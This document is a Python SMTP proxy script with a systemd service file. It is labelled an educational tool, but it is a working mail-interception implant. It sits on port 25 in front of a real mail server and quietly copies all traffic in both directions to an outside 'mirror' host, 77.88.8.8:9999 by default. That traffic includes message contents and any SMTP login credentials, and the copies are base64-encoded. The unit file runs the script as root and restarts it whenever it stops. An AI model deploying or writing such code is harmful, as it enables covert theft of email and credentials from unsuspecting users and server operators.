#!/usr/bin/env python3
import socket
import threading
import sys
import argparse
import base64
import logging
import os

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(threadName)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)


def encode_and_send(data: bytes, mirror_sock: socket.socket):
    try:
        encoded = base64.b64encode(data)
        message = f"{len(encoded):08d}".encode() + encoded
        mirror_sock.sendall(message)
        logger.debug(f"Sent to mirror: {len(data)} bytes -> {len(encoded)} base64 bytes")
    except Exception as e:
        logger.error(f"Mirror send error: {e}")


def forward(source: socket.socket, dest: socket.socket, mirror: socket.socket):
    while True:
        try:
            data = source.recv(4096)
            if not data:
                break
            dest.sendall(data)
            encode_and_send(data, mirror)
        except Exception as e:
            logger.error(f"Forward error: {e}")
            break
    try:
        source.shutdown(socket.SHUT_RD)
    except:
        pass
    try:
        dest.shutdown(socket.SHUT_WR)
    except:
        pass


def handle_client(client_sock: socket.socket, target_addr: tuple, mirror_addr: tuple):
    try:
        target_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        target_sock.connect(target_addr)
        logger.info(f"Connected to target SMTP {target_addr}")
    except Exception as e:
        logger.error(f"Target connect failed {target_addr}: {e}")
        client_sock.close()
        return

    try:
        mirror_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        mirror_sock.connect(mirror_addr)
        logger.info(f"Connected to mirror {mirror_addr}")
    except Exception as e:
        logger.error(f"Mirror connect failed {mirror_addr}: {e}")
        client_sock.close()
        target_sock.close()
        return

    client_to_smtp = threading.Thread(
        target=forward,
        args=(client_sock, target_sock, mirror_sock),
        daemon=True
    )
    smtp_to_client = threading.Thread(
        target=forward,
        args=(target_sock, client_sock, mirror_sock),
        daemon=True
    )

    client_to_smtp.start()
    smtp_to_client.start()
    client_to_smtp.join()
    smtp_to_client.join()

    client_sock.close()
    target_sock.close()
    mirror_sock.close()
    logger.info("Client connection closed")


def start_proxy(listen_port: int, target_host: str, target_port: int,
                mirror_host: str, mirror_port: int):
    server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        server_sock.bind(('0.0.0.0', listen_port))
        server_sock.listen(5)
        logger.info(f"Proxy listening on port {listen_port}")
        logger.info(f"Target SMTP: {target_host}:{target_port}")
        logger.info(f"Mirror server: {mirror_host}:{mirror_port}")
    except Exception as e:
        logger.error(f"Proxy startup error: {e}")
        sys.exit(1)

    while True:
        try:
            client_sock, client_addr = server_sock.accept()
            logger.info(f"New connection from {client_addr}")
            client_thread = threading.Thread(
                target=handle_client,
                args=(client_sock, (target_host, target_port), (mirror_host, mirror_port)),
                daemon=True
            )
            client_thread.start()
        except KeyboardInterrupt:
            logger.info("Shutting down")
            break
        except Exception as e:
            logger.error(f"Accept error: {e}")

    server_sock.close()


def parse_args():
    parser = argparse.ArgumentParser(description="SMTP Mirror Proxy")
    parser.add_argument('--listen-port', type=int, default=25, help="Local port to listen on")
    parser.add_argument('--target-host', default='127.0.0.1', help="Real SMTP server host")
    parser.add_argument('--target-port', type=int, default=25, help="Real SMTP server port")
    parser.add_argument('--mirror-host', default='77.88.8.8', help="Mirror server host")
    parser.add_argument('--mirror-port', type=int, default=9999, help="Mirror server port")
    parser.add_argument('--verbose', action='store_true', help="Enable debug logging")
    return parser.parse_args()


def main():
    args = parse_args()
    if args.verbose:
        logging.getLogger().setLevel(logging.DEBUG)

    if args.listen_port == 25 and sys.platform != 'win32':
        try:
            if os.geteuid() != 0:
                logger.warning("Port 25 requires root privileges.")
        except AttributeError:
            pass

    start_proxy(
        listen_port=args.listen_port,
        target_host=args.target_host,
        target_port=args.target_port,
        mirror_host=args.mirror_host,
        mirror_port=args.mirror_port
    )


if __name__ == '__main__':
    main()





[Unit]
Description=SMTP Mirror Proxy (Educational Tool)
After=network.target

[Service]
Type=simple
User=root
Group=root
ExecStart=/usr/bin/python3 /usr/local/bin/smtp_mirror.py --listen-port 25 --target-host 127.0.0.1 --target-port 25 --mirror-host 77.88.8.8 --mirror-port 9999
Restart=always
RestartSec=5
StandardOutput=journal
StandardError=journal

[Install]
WantedBy=multi-user.target
